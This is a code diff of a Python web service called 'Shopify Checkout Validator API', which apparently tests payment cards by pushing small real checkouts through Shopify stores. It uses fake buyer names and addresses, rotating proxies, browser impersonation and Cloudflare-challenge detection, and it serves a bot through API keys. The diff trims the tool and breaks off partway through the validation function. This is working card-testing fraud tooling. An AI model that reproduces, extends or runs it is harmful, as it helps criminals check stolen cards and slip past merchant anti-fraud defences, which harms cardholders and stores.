@@ -1,35 +1,41 @@
 """
-Shopify Checkout Validator API — Stateless v4.5.3
+Shopify Checkout Validator API — Stateless v4.6.0 (lightweight)
 
-Performance patches (on top of v4.5.2):
-  * REQUEST_TIMEOUT 25s → 12s (fails faster on dead sites)
-  * CACHE_TTL 300s → 900s (fewer /products.json refetches)
-  * VARIANT_TTL 1800s → 3600s (fewer variant recomputations)
-  * SKIP_DELIVERY_PROPOSAL: skip the delivery-proposal GraphQL call
-    (300-800ms saved per card on ~95% of runs). Set
-    SKIP_DELIVERY_PROPOSAL=0 to disable if some sites fail.
-  * Poll loop front-loaded: (0.3, 0.6, 0.9, 1.2, 1.5) = 4.5s budget
-    (was 6.5s). Catches fast receipts earlier.
-  * Vault: only retry fallback endpoint on HTTP 404. Timeouts / 5xx
-    mean vault is unhealthy — fallback doesn't help, wasted 300-800ms.
+Trimmed from v4.5.4. Removed:
+  * _auto_validate + _site_error_result + /shopify-race
+    (bot always passes fallback_sites=None, auto=false — dead code path)
+  * Proxy active probe (_verify_proxy_death) — was spawning hundreds
+    of background tasks under load on Railway Hobby; not needed when
+    the card-level PROXY_ERROR classification already handles it
+  * Admin/monitoring endpoints: /proxy-check /proxy-health /proxy-clear
+    /healthy-sites /site-stats /quarantine /skip-site /pool-diagnose
+    /host-throttle /stats /cache/clear /site-stats/clear
+  * Trimmed USER_AGENTS to 3, ADDRESS_BOOK to 7 entries, EMAIL_DOMAINS to 4
+  * Removed second vault URL (deposit.shopifyinc.com — legacy)
+  * Faster poll cadence: 3.3s budget (was 4.5s)
 
-Bug fixes carried forward from v4.5.2:
-  * Single-site mode enforced in /shopify (auto=false + site → single site)
-  * HOST_RATE_LIMIT effectively disabled (10000/60s)
-  * BLACKLIST 50 samples @ 98% threshold
-  * SITES_EXHAUSTED removed from SITE_ERROR_CODES
+Retained (all required for bot traffic):
+  * GET  /shopify        — main validation endpoint
+  * GET  /check          — single-site convenience endpoint
+  * GET  /dead-sites     — used by /prunedead in bot
+  * POST /dead-sites/clear — used by /prunedead in bot
+  * POST /reload         — used by /prunedead in bot
+  * GET  /health         — monitoring
+
+Shared state hook retained but optional. If shared_state.py exists and
+REDIS_URL is set, multi-replica state sharing works. Otherwise runs
+single-replica with zero overhead.
 """
 
 import asyncio
 import copy
-import hashlib
 import logging
 import os
 import random
 import re
 import time
 from collections import defaultdict, deque
-from typing import Any, Optional
+from typing import Optional
 from urllib.parse import urlparse
 
 from curl_cffi.requests import AsyncSession, RequestsError
@@ -41,8 +47,15 @@ from fastapi.responses import JSONResponse
 from dotenv import load_dotenv
 load_dotenv()
 
+# ─── Optional shared state (multi-replica) ───
+try:
+    from shared_state import init as _init_shared
+    _shared = _init_shared(os.environ.get("REDIS_URL", "").strip())
+except Exception:
+    _shared = None
+
 # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-# CONFIGURATION
+# CONFIG
 # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 
 PORT              = int(os.environ.get("PORT", 8080))
@@ -51,31 +64,19 @@ MAX_PRICE         = float(os.environ.get("MAX_PRICE", 5.0))
 MIN_AMOUNT        = float(os.environ.get("MIN_AMOUNT", 0.50))
 HARD_MAX_PRICE    = float(os.environ.get("HARD_MAX_PRICE", 20.0))
 SITE_CONCURRENCY  = int(os.environ.get("SITE_CONCURRENCY", 100))
-AUTO_ATTEMPTS     = int(os.environ.get("AUTO_ATTEMPTS", 30))
-AUTO_BATCH_SIZE   = int(os.environ.get("AUTO_BATCH_SIZE", 12))
-RACE_COUNT        = int(os.environ.get("RACE_COUNT", 3))
 
 BLACKLIST_THRESHOLD = float(os.environ.get("BLACKLIST_THRESHOLD", 0.98))
 BLACKLIST_SAMPLES   = int(os.environ.get("BLACKLIST_SAMPLES", 50))
 BLACKLIST_SECONDS   = int(os.environ.get("BLACKLIST_SECONDS", 15))
 
-# PERF: 12s catches every working site; 25s let dead-site cards burn budget
 REQUEST_TIMEOUT   = float(os.environ.get("REQUEST_TIMEOUT", 12))
-# PERF: bigger cache = fewer /products.json fetches (each 200-500ms)
 CACHE_TTL         = float(os.environ.get("CACHE_TTL", 900))
 VARIANT_TTL       = float(os.environ.get("VARIANT_TTL", 3600))
-
 FAIL_CACHE_TTL    = float(os.environ.get("FAIL_CACHE_TTL", 300))
 THROTTLE_COOLDOWN = int(os.environ.get("THROTTLE_COOLDOWN", 300))
 LOG_LEVEL         = os.environ.get("LOG_LEVEL", "warning").upper()
 IMPERSONATE       = os.environ.get("IMPERSONATE", "chrome124")
 
-# PERF: skip the delivery-proposal GraphQL round-trip (300-800ms saved).
-# The shipping proposal's strategy is sufficient; submit accepts
-# expectedTotalPrice:{"any":true}.
-SKIP_DELIVERY_PROPOSAL = os.environ.get("SKIP_DELIVERY_PROPOSAL", "1") == "1"
-
-# Hard-dead cache
 _HARD_DEAD_TTL_PERMANENT = int(os.environ.get("HARD_DEAD_TTL_PERMANENT", 7200))
 _HARD_DEAD_TTL_PROBABLE  = int(os.environ.get("HARD_DEAD_TTL_PROBABLE",  1800))
 _HARD_DEAD_PERMANENT_CODES = frozenset({
@@ -87,20 +88,12 @@ _HARD_DEAD_AUTO_MARK = frozenset({
     "SITE_REQUIRES_LOGIN", "NO_SHOPIFY_PAYMENTS_GATEWAY", "PRICE_TOO_HIGH",
 })
 
-# Per-host self-throttle (effectively disabled)
 _HOST_RATE_LIMIT   = int(os.environ.get("HOST_RATE_LIMIT", 10000))
 _HOST_RATE_WINDOW  = int(os.environ.get("HOST_RATE_WINDOW", 60))
 _HOST_COOLDOWN_SEC = int(os.environ.get("HOST_COOLDOWN_SEC", 30))
 
-# Proxy health
-PROXY_COOLDOWN_BASE       = int(os.environ.get("PROXY_COOLDOWN_BASE", 60))
-PROXY_COOLDOWN_MAX        = int(os.environ.get("PROXY_COOLDOWN_MAX", 1800))
-PROXY_ACTIVE_CHECK_URL    = os.environ.get(
-    "PROXY_ACTIVE_CHECK_URL", "https://api.ipify.org?format=json"
-)
-PROXY_ACTIVE_CHECK_TIMEOUT = float(
-    os.environ.get("PROXY_ACTIVE_CHECK_TIMEOUT", 8.0)
-)
+PROXY_COOLDOWN_BASE = int(os.environ.get("PROXY_COOLDOWN_BASE", 60))
+PROXY_COOLDOWN_MAX  = int(os.environ.get("PROXY_COOLDOWN_MAX", 1800))
 
 VALID_API_KEYS = set(
     k.strip() for k in os.environ.get("API_KEYS", "oozaruhshop").split(",")
@@ -124,11 +117,7 @@ KNOWN_CARD_RESPONSES = frozenset({
 SKIP_SITE_CODES = frozenset({
     "NO_PRODUCT", "NO_PRODUCT_FOUND", "PRICE_TOO_HIGH", "PRICE_OVER_MAX",
     "SITE_REQUIRES_LOGIN", "NO_SHOPIFY_PAYMENTS_GATEWAY", "THROTTLED",
-    "CAPTCHA_REQUIRED", "SITES_EXHAUSTED",
-})
-
-PROXY_ERROR_CODES = frozenset({
-    "PROXY_ERROR", "TIMEOUT", "API_REPLICAS_UNREACHABLE",
+    "CAPTCHA_REQUIRED",
 })
 
 SITE_ERROR_CODES = frozenset({
@@ -140,8 +129,7 @@ SITE_ERROR_CODES = frozenset({
 })
 
 TRANSIENT_CODES = frozenset({
-    "TIMEOUT", "THROTTLED", "PROXY_ERROR",
-    "API_REPLICAS_UNREACHABLE", "GRAPHQL_ERROR", "SITE_ERROR",
+    "TIMEOUT", "THROTTLED", "PROXY_ERROR", "GRAPHQL_ERROR", "SITE_ERROR",
     "CHECKOUT_FAILED", "CART_FAILED", "SESSION_EXPIRED",
 })
 
@@ -294,23 +282,6 @@ QUERY_PROPOSAL_SHIPPING = (
     "errors{code localizedMessage nonLocalizedMessage __typename}}}}"
 )
 
-QUERY_PROPOSAL_DELIVERY = (
-    "query Proposal(" + _PROPOSAL_VARS + ")"
-    "{session(sessionInput:$sessionInput){negotiate(input:{purchaseProposal:{"
-    + _PROPOSAL_ARGS + "},"
-    "checkpointData:$checkpointData,queueToken:$queueToken})"
-    "{__typename result{__typename "
-    "...on NegotiationResultAvailable{checkpointData queueToken sessionToken "
-    + _SELLER_PROPOSAL_FIELDS + "}"
-    "...on CheckpointDenied{redirectUrl}"
-    "...on Throttled{pollAfter queueToken pollUrl}"
-    "...on TooManyRequests{__typename}"
-    "...on SubmittedForCompletion{receipt{...ReceiptDetails}}"
-    "...on NegotiationResultFailed{__typename}}"
-    "errors{code localizedMessage nonLocalizedMessage __typename}}}}"
-    + _RECEIPT_FRAGMENT
-)
-
 MUTATION_SUBMIT = (
     "mutation SubmitForCompletion("
     "$input:NegotiationInput!,$attemptToken:String!,"
@@ -355,23 +326,14 @@ C2C = {
     "JPY": "JP", "KRW": "KR",
 }
 
+# Trimmed to 7 entries. Sites with other TLDs fall to DEFAULT (US).
 ADDRESS_BOOK: dict[str, dict] = {
     "US": {"address1": "123 Main St",       "city": "New York",    "postalCode": "10001",   "zoneCode": "NY",  "countryCode": "US", "phone": "2124157586"},
     "CA": {"address1": "88 Queen St W",     "city": "Toronto",     "postalCode": "M5J2J3",  "zoneCode": "ON",  "countryCode": "CA", "phone": "4165550198"},
     "GB": {"address1": "221B Baker Street", "city": "London",      "postalCode": "NW1 6XE", "zoneCode": "ENG", "countryCode": "GB", "phone": "2079460123"},
-    "IN": {"address1": "221B MG Road",      "city": "Mumbai",      "postalCode": "400001",  "zoneCode": "MH",  "countryCode": "IN", "phone": "9876543210"},
-    "AE": {"address1": "Burj Khalifa Tower","city": "Dubai",       "postalCode": "00000",   "zoneCode": "DU",  "countryCode": "AE", "phone": "501234567"},
-    "HK": {"address1": "88 Nathan Road",    "city": "Kowloon",     "postalCode": "000000",  "zoneCode": "KLN", "countryCode": "HK", "phone": "55555555"},
-    "CH": {"address1": "Gotthardstrasse 17","city": "Schwyz",      "postalCode": "6430",    "zoneCode": "SZ",  "countryCode": "CH", "phone": "445512345"},
     "AU": {"address1": "1 Martin Place",    "city": "Sydney",      "postalCode": "2000",    "zoneCode": "NSW", "countryCode": "AU", "phone": "291234567"},
     "DE": {"address1": "Unter den Linden 1","city": "Berlin",      "postalCode": "10117",   "zoneCode": "BE",  "countryCode": "DE", "phone": "3012345678"},
     "FR": {"address1": "1 Rue de Rivoli",   "city": "Paris",       "postalCode": "75001",   "zoneCode": "IDF", "countryCode": "FR", "phone": "142123456"},
-    "NZ": {"address1": "1 Queen Street",    "city": "Auckland",    "postalCode": "1010",    "zoneCode": "AUK", "countryCode": "NZ", "phone": "98765432"},
-    "SG": {"address1": "1 Raffles Place",   "city": "Singapore",   "postalCode": "048616",  "zoneCode": "01",  "countryCode": "SG", "phone": "61234567"},
-    "JP": {"address1": "1-1 Marunouchi",    "city": "Tokyo",       "postalCode": "100-0005","zoneCode": "13",  "countryCode": "JP", "phone": "312345678"},
-    "BR": {"address1": "Av. Paulista 1000", "city": "Sao Paulo",   "postalCode": "01310-100","zoneCode": "SP", "countryCode": "BR", "phone": "1112345678"},
-    "MX": {"address1": "Paseo de la Reforma 1","city": "Mexico City","postalCode": "06600", "zoneCode": "CMX","countryCode": "MX", "phone": "5512345678"},
-    "SE": {"address1": "Drottninggatan 1",  "city": "Stockholm",   "postalCode": "11151",   "zoneCode": "AB",  "countryCode": "SE", "phone": "812345678"},
     "DEFAULT": {"address1": "123 Main St",  "city": "New York",    "postalCode": "10001",   "zoneCode": "NY",  "countryCode": "US", "phone": "2124157586"},
 }
 
@@ -381,15 +343,12 @@ FIRST_NAMES = ["James","John","Robert","Michael","William","David","Richard","Jo
 LAST_NAMES  = ["Smith","Johnson","Williams","Brown","Jones","Garcia","Miller","Davis","Rodriguez",
                "Martinez","Hernandez","Wilson","Anderson","Thomas","Taylor","Moore","Jackson","Lee",
                "White","Harris","Martin","Thompson","Turner","Mitchell","Campbell","Roberts","Evans"]
-EMAIL_DOMAINS = ["gmail.com","yahoo.com","outlook.com","protonmail.com","icloud.com","hotmail.com",
-                 "live.com","mail.com","aol.com"]
+EMAIL_DOMAINS = ["gmail.com","yahoo.com","outlook.com","icloud.com"]
 
 USER_AGENTS = [
     "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
     "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36",
-    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36",
     "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
-    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36",
 ]
 
 # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
@@ -406,8 +365,6 @@ _host_locks: dict[str, asyncio.Lock] = defaultdict(asyncio.Lock)
 _site_stats: dict[str, dict] = defaultdict(lambda: {
     "outcomes":          deque(maxlen=BLACKLIST_SAMPLES),
     "blacklisted_until": 0.0,
-    "success_count":     0,
-    "error_count":       0,
     "last_response":     "",
 })
 _site_throttle: dict[str, float] = {}
@@ -415,14 +372,12 @@ _HARD_DEAD_CACHE: dict[str, float] = {}
 _HOST_HITS: dict[str, deque] = defaultdict(lambda: deque(maxlen=200))
 _HOST_COOLDOWN: dict[str, float] = {}
 
-_PROXY_HEALTH: dict[str, dict] = {}
-_PROXY_PROBE_INFLIGHT: set[str] = set()
-_PROXY_LOCK = asyncio.Lock()
+# Simplified proxy state: two dicts instead of one dict-of-dicts
+_PROXY_DEAD_UNTIL: dict[str, float] = {}
+_PROXY_FAIL_COUNT: dict[str, int] = {}
 
 _cards_cache: list[dict] = []
 _cards_loaded_at: float = 0.0
-
-_stats: dict[str, int] = defaultdict(int)
 
 # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 # CACHE HELPERS
@@ -458,9 +413,7 @@ def _normalize_site(s: Optional[str]) -> str:
     s = s.strip()
     if not s:
         return ""
-    if s.startswith(("http://", "https://")):
-        return s
-    return f"https://{s}"
+    return s if s.startswith(("http://", "https://")) else f"https://{s}"
 
 def _parse_sites_param(raw: Optional[str]) -> list[str]:
     if not raw:
@@ -476,7 +429,7 @@ def _parse_sites_param(raw: Optional[str]) -> list[str]:
     return out
 
 # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-# PROXY NORMALIZATION / MASKING / HEALTH
+# PROXY
 # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 
 def _parse_proxy(raw: Optional[str]) -> Optional[str]:
@@ -513,53 +466,41 @@ def _mask_proxy(p: Optional[str]) -> str:
         return f"***@{host}"
     return p
 
-def _proxy_id(p: str) -> str:
-    return hashlib.sha256(p.encode()).hexdigest()[:12]
-
-def _proxy_entry(p: str) -> dict:
-    return _PROXY_HEALTH.setdefault(p, {
-        "dead_until":   0.0,
-        "fail_count":   0,
-        "success_count": 0,
-        "last_error":   "",
-    })
-
 def _proxy_usable(proxy_str: Optional[str]) -> tuple[bool, str]:
     if not proxy_str:
         return True, ""
-    entry = _PROXY_HEALTH.get(proxy_str)
-    if not entry:
-        return True, ""
-    dead_until = entry.get("dead_until", 0)
-    if time.time() < dead_until:
-        remaining = int(dead_until - time.time())
-        return False, f"cooling down {remaining}s: {entry.get('last_error', '')[:60]}"
+    now = time.time()
+    # Check shared state first (cluster-wide)
+    if _shared and _shared.enabled and _shared.is_proxy_dead(proxy_str):
+        return False, "cooling down (cluster)"
+    dead_until = _PROXY_DEAD_UNTIL.get(proxy_str, 0)
+    if now < dead_until:
+        return False, f"cooling down {int(dead_until - now)}s"
     return True, ""
 
 def _mark_proxy_dead(proxy_str: Optional[str], error: str) -> None:
     if not proxy_str:
         return
-    e = _proxy_entry(proxy_str)
-    e["fail_count"] = e.get("fail_count", 0) + 1
+    fail_count = _PROXY_FAIL_COUNT.get(proxy_str, 0) + 1
+    _PROXY_FAIL_COUNT[proxy_str] = fail_count
     cooldown = min(
-        PROXY_COOLDOWN_BASE * (2 ** min(e["fail_count"] - 1, 6)),
+        PROXY_COOLDOWN_BASE * (2 ** min(fail_count - 1, 6)),
         PROXY_COOLDOWN_MAX,
     )
-    e["dead_until"] = time.time() + cooldown
-    e["last_error"] = (error or "unknown")[:200]
+    exp = time.time() + cooldown
+    _PROXY_DEAD_UNTIL[proxy_str] = exp
+    if _shared and _shared.enabled:
+        _shared.mark_proxy_dead(proxy_str, exp)
     log.warning("[API] proxy DEAD for %ds (fail#%d): %s (%s)",
-                cooldown, e["fail_count"],
-                _mask_proxy(proxy_str)[:50], e["last_error"][:80])
+                cooldown, fail_count, _mask_proxy(proxy_str)[:50], (error or "")[:80])
 
 def _mark_proxy_alive(proxy_str: Optional[str]) -> None:
     if not proxy_str:
         return
-    e = _proxy_entry(proxy_str)
-    if e.get("dead_until", 0) > time.time():
-        log.info("[API] proxy recovered: %s", _mask_proxy(proxy_str)[:50])
-    e["success_count"] = e.get("success_count", 0) + 1
-    e["fail_count"] = 0
-    e["dead_until"] = 0.0
+    _PROXY_DEAD_UNTIL.pop(proxy_str, None)
+    _PROXY_FAIL_COUNT.pop(proxy_str, None)
+    if _shared and _shared.enabled:
+        _shared.mark_proxy_alive(proxy_str)
 
 def _make_session(proxy_str: Optional[str] = None) -> AsyncSession:
     proxy = _parse_proxy(proxy_str) if proxy_str else None
@@ -576,52 +517,6 @@ async def _close_session(s: AsyncSession) -> None:
     except Exception:
         pass
 
-async def _probe_proxy(proxy_str: str) -> tuple[bool, Optional[str], Optional[int], Optional[str]]:
-    t0 = time.time()
-    try:
-        session = _make_session(proxy_str)
-    except Exception as ex:
-        return False, None, int((time.time() - t0) * 1000), f"session init: {str(ex)[:80]}"
-    try:
-        r = await session.get(
-            PROXY_ACTIVE_CHECK_URL,
-            timeout=PROXY_ACTIVE_CHECK_TIMEOUT,
-        )
-        latency = int((time.time() - t0) * 1000)
-        if r.status_code == 200:
-            try:
-                ip = str(orjson.loads(r.content).get("ip") or "")[:45]
-            except Exception:
-                ip = r.text.strip()[:45]
-            return True, ip, latency, None
-        return False, None, latency, f"HTTP {r.status_code}"
-    except Exception as ex:
-        return False, None, int((time.time() - t0) * 1000), str(ex)[:100]
-    finally:
-        await _close_session(session)
-
-async def _verify_proxy_death(proxy_str: Optional[str], original_error: str) -> None:
-    if not proxy_str:
-        return
-    if proxy_str in _PROXY_PROBE_INFLIGHT:
-        return
-    if not _proxy_usable(proxy_str)[0]:
-        return
-    _PROXY_PROBE_INFLIGHT.add(proxy_str)
-    try:
-        ok, _, _, probe_err = await _probe_proxy(proxy_str)
-        if not ok:
-            _mark_proxy_dead(
-                proxy_str,
-                f"card error: {original_error[:80]} | probe: {probe_err or 'fail'}"
-            )
-        else:
-            _mark_proxy_alive(proxy_str)
-            log.info("[API] proxy error was site-specific; %s still alive",
-                     _mask_proxy(proxy_str)[:50])
-    finally:
-        _PROXY_PROBE_INFLIGHT.discard(proxy_str)
-
 def _pick_proxy(proxy_param: Optional[str]) -> tuple[Optional[str], list[str]]:
     if not proxy_param:
         return None, []
@@ -637,7 +532,7 @@ def _pick_proxy(proxy_param: Optional[str]) -> tuple[Optional[str], list[str]]:
     return None, rejected
 
 # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-# CARD / IDENTITY HELPERS
+# CARDS / IDENTITY
 # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 
 def _reload_cards() -> None:
@@ -736,15 +631,6 @@ def _extract_sst(text: str, headers: dict) -> Optional[str]:
     return None
 
 def _ua_headers(ua: str) -> dict:
-    if "Firefox" in ua:
-        return {
-            "User-Agent": ua,
-            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
-            "Accept-Language": "en-US,en;q=0.5",
-            "DNT": "1",
-            "Connection": "keep-alive",
-            "Upgrade-Insecure-Requests": "1",
-        }
     major = re.search(r"Chrome/(\d+)", ua)
     chrome_ver = major.group(1) if major else "124"
     return {
@@ -886,16 +772,28 @@ def _parse_gql_errors(errors: list) -> str:
 # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 
 def _is_blacklisted(hostname: str) -> bool:
+    if _shared and _shared.enabled and _shared.is_blacklisted(hostname):
+        return True
     s = _site_stats.get(hostname)
     if not s:
         return False
     return time.time() < s.get("blacklisted_until", 0)
 
 def _is_throttled(hostname: str) -> bool:
+    if _shared and _shared.enabled and _shared.is_throttled(hostname):
+        return True
     return time.time() < _site_throttle.get(hostname, 0)
 
 def _host_cooldown_active(hostname: str) -> bool:
+    if _shared and _shared.enabled and _shared.is_host_cooling(hostname):
+        return True
     return time.time() < _HOST_COOLDOWN.get(hostname, 0)
+
+def _is_hard_dead(hostname: str) -> bool:
+    if _shared and _shared.enabled and _shared.is_hard_dead(hostname):
+        return True
+    exp = _HARD_DEAD_CACHE.get(hostname)
+    return bool(exp and time.time() < exp)
 
 def _site_usable(hostname: str) -> tuple[bool, str]:
     if _is_hard_dead(hostname):
@@ -919,12 +817,11 @@ def _mark_hard_dead(hostname: str, code: str) -> None:
         ttl = _HARD_DEAD_TTL_PROBABLE
     else:
         return
-    _HARD_DEAD_CACHE[hostname] = time.time() + ttl
+    exp = time.time() + ttl
+    _HARD_DEAD_CACHE[hostname] = exp
+    if _shared and _shared.enabled:
+        _shared.mark_hard_dead(hostname, exp)
     log.info("[API] hard-dead cached: %s (%s) for %ds", hostname, code, ttl)
-
-def _is_hard_dead(hostname: str) -> bool:
-    exp = _HARD_DEAD_CACHE.get(hostname)
-    return bool(exp and time.time() < exp)
 
 def _host_rate_allowed(hostname: str) -> bool:
     now = time.time()
@@ -934,7 +831,10 @@ def _host_rate_allowed(hostname: str) -> bool:
     while hits and hits[0] < now - _HOST_RATE_WINDOW:
         hits.popleft()
     if len(hits) >= _HOST_RATE_LIMIT:
-        _HOST_COOLDOWN[hostname] = now + _HOST_COOLDOWN_SEC
+        exp = now + _HOST_COOLDOWN_SEC
+        _HOST_COOLDOWN[hostname] = exp
+        if _shared and _shared.enabled:
+            _shared.mark_host_cooling(hostname, exp)
         log.warning("[API] self-throttled %s (%d hits in %ds) for %ds",
                     hostname, len(hits), _HOST_RATE_WINDOW, _HOST_COOLDOWN_SEC)
         return False
@@ -947,19 +847,21 @@ def _record_site_result(hostname: str, response_code: str) -> None:
     s = _site_stats[hostname]
     s["last_response"] = response_code
     if response_code == "THROTTLED":
-        _site_throttle[hostname] = time.time() + THROTTLE_COOLDOWN
+        exp = time.time() + THROTTLE_COOLDOWN
+        _site_throttle[hostname] = exp
+        if _shared and _shared.enabled:
+            _shared.mark_throttled(hostname, exp)
         return
     if response_code in PROXY_STOP_CODES or response_code in TRANSIENT_CODES:
         return
     is_err = response_code in SITE_ERROR_CODES
     s["outcomes"].append(1 if is_err else 0)
-    if is_err:
-        s["error_count"] += 1
-    else:
-        s["success_count"] += 1
     if (len(s["outcomes"]) >= BLACKLIST_SAMPLES and
             sum(s["outcomes"]) / len(s["outcomes"]) >= BLACKLIST_THRESHOLD):
-        s["blacklisted_until"] = time.time() + BLACKLIST_SECONDS
+        exp = time.time() + BLACKLIST_SECONDS
+        s["blacklisted_until"] = exp
+        if _shared and _shared.enabled:
+            _shared.mark_blacklisted(hostname, exp)
         log.warning("[API] blacklisted for %ds: %s (%d/%d errors)",
                     BLACKLIST_SECONDS, hostname,
                     sum(s["outcomes"]), len(s["outcomes"]))
@@ -981,7 +883,7 @@ def _preferred_variant(candidates: list[dict], max_price: float) -> Optional[dic
     return min(candidates, key=_pf)
 
 # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-# PRODUCT FETCH
+# PRODUCT FETCH (with early-exit optimization)
 # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 
 async def _fetch_products(
@@ -1032,6 +934,8 @@ async def _fetch_products(
             candidates: list[dict] = []
             cheapest_any: Optional[dict] = None
             cheapest_any_price = float("inf")
+            # PERF: stop scanning once we have a healthy surplus + a cheap pick
+            ENOUGH = 25
 
             for product in all_products:
                 for variant in product.get("variants", []):
@@ -1056,6 +960,8 @@ async def _fetch_products(
                         cheapest_any = entry
                     if price <= max_price:
                         candidates.append(entry)
+                if len(candidates) >= ENOUGH and cheapest_any_price <= max_price * 0.5:
+                    break
 
             if not candidates and cheapest_any is None:
                 _cache_write_failure(hostname, "No products found", ttl=1800)
@@ -1086,7 +992,7 @@ async def _fetch_products(
                 await _close_session(session)
 
 # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-# CORE — VALIDATE A CARD AGAINST A SITE
+# CORE VALIDATION
 # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 
 async def validate_card(
@@ -1123,12 +1029,7 @@ async def validate_card(
         elif hard_dead_code:
             _mark_hard_dead(hostname, hard_dead_code)
         if proxy_dead:
-            try:
-                asyncio.create_task(_verify_proxy_death(
-                    proxy_str, message or "proxy error"
-                ))
-            except RuntimeError:
-                _mark_proxy_dead(proxy_str, message or "proxy error")
+            _mark_proxy_dead(proxy_str, message or "proxy error")
         elif code_upper in FINAL_CODES or code_upper == "SITE_VALIDATED":
             _mark_proxy_alive(proxy_str)
 
@@ -1335,14 +1236,12 @@ async def validate_card(
             sst = _extract_sst(page_text, dict(cr.headers))
             if not sst:
                 early_lower = page_text[:5000].lower()
-                strong_challenge = any(k in early_lower for k in (
+                if any(k in early_lower for k in (
                     "<title>just a moment...</title>",
                     "<title>attention required! | cloudflare</title>",
                     ">verify you are human<",
                     ">please verify you are a human<",
-                    ">checking your browser before accessing<",
-                ))
-                if strong_challenge:
+                )):
                     return _r("CAPTCHA_REQUIRED",
                               message="Cloudflare challenge at checkout",
                               is_site_error=True)
@@ -1650,120 +1549,6 @@ async def validate_card(
                           message="Store does not use Shopify Payments",
                           is_site_error=True)
 
-            deliv_vars = copy.deepcopy(ship_vars)
-            deliv_vars["sessionInput"]["sessionToken"] = sst
-            deliv_vars["delivery"]["deliveryLines"][0].update({
-                "destination": {"streetAddress": {
-                    "address1": street, "address2": "", "city": city,
-                    "countryCode": country_code, "postalCode": s_zip,
-                    "firstName": first, "lastName": last,
-                    "zoneCode": state, "phone": phone,
-                }},
-                "selectedDeliveryStrategy": {
-                    "deliveryStrategyByHandle": {
-                        "handle": delivery_strategy, "customDeliveryRate": False
-                    },
-                    "options": {},
-                },
-                "targetMerchandiseLines": {"lines": [{"stableId": stable_id}]},
-                "expectedTotalPrice": {
-                    "value": {"amount": str(shipping_amount),
-                              "currencyCode": currency}
-                },
-                "destinationChanged": False,
-            })
-            deliv_vars["payment"]["billingAddress"] = {"streetAddress": {
-                "address1": street, "address2": "", "city": city,
-                "countryCode": country_code, "postalCode": s_zip,
-                "firstName": first, "lastName": last,
-                "zoneCode": state, "phone": phone,
-            }}
-            deliv_vars["taxes"]["proposedTotalAmount"] = {
-                "value": {"amount": str(tax_amount), "currencyCode": currency}
-            }
-            deliv_vars["buyerIdentity"]["shopPayOptInPhone"] = {
-                "number": phone, "countryCode": country_code
-            }
-            if checkpoint_data:
-                deliv_vars["checkpointData"] = checkpoint_data
-
-            # PERF: skip the delivery proposal GraphQL call when
-            # SKIP_DELIVERY_PROPOSAL=1 (default). The shipping proposal's
-            # delivery_strategy + running_total are sufficient for submit;
-            # we sacrifice ~$0.01 accuracy in price display for a
-            # 300-800ms per-card speedup.
-            if not SKIP_DELIVERY_PROPOSAL:
-                try:
-                    dr = await session.post(
-                        graphql_url,
-                        params={"operationName": "Proposal"},
-                        headers=gql_headers,
-                        json={"query": QUERY_PROPOSAL_DELIVERY,
-                              "variables": deliv_vars,
-                              "operationName": "Proposal"},
-                    )
-                    d_resp = orjson.loads(dr.content)
-                    _del_sst = dr.headers.get("x-checkout-one-session-token")
-                    if _del_sst:
-                        sst = _del_sst
-                        gql_headers["x-checkout-one-session-token"] = sst
-                    d_result = (d_resp.get("data", {}).get("session", {})
-                                .get("negotiate", {}).get("result", {}))
-                    if d_result:
-                        d_typename = d_result.get("__typename", "")
-                        if d_typename == "SubmittedForCompletion":
-                            return _r("NO_PAYMENT_REQUIRED",
-                                      message="Order auto-submitted before card entry",
-                                      is_site_error=True)
-                        d_seller = d_result.get("sellerProposal") or {}
-                        d_total = d_seller.get("total") or d_seller.get("runningTotal") or {}
-                        d_amt = (d_total.get("value", {}).get("amount") or
-                                 d_total.get("amount"))
-                        if d_amt:
-                            running_total = d_amt
-                            try:
-                                price = f"{float(running_total):.2f}"
-                            except (ValueError, TypeError):
-                                pass
-                        d_delivery = d_seller.get("delivery") or {}
-                        if d_delivery.get("__typename") == "FilledDeliveryTerms":
-                            d_d_lines = d_delivery.get("deliveryLines") or []
-                            if d_d_lines:
-                                d_strategies = (
-                                    d_d_lines[0].get("availableDeliveryStrategies") or []
-                                )
-                                d_selected = d_d_lines[0].get("selectedDeliveryStrategy") or {}
